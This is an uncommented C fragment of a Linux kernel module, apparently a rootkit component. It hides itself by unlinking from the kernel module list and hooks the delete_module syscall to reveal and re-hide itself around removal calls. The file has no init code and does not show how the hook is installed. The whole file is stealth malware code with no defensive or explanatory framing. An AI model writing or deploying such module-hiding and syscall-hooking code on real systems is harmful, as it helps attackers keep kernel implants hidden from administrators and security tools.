#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/unistd.h>

static struct list_head *prev_module;
static unsigned short is_hidden = 0;

void reveal_module(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    is_hidden = 0;
}

void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_hidden = 1;
}


asmlinkage int (*delete_module)(const char *name, unsigned int flags);

static asmlinkage int hook_delete_module(const char *name, unsigned int flags)
{
    int ret;

    if (is_hidden == 1)
        reveal_module();
        
    ret = delete_module(name, flags);

    if (is_hidden == 0)
        hide_module();

    return ret;
}
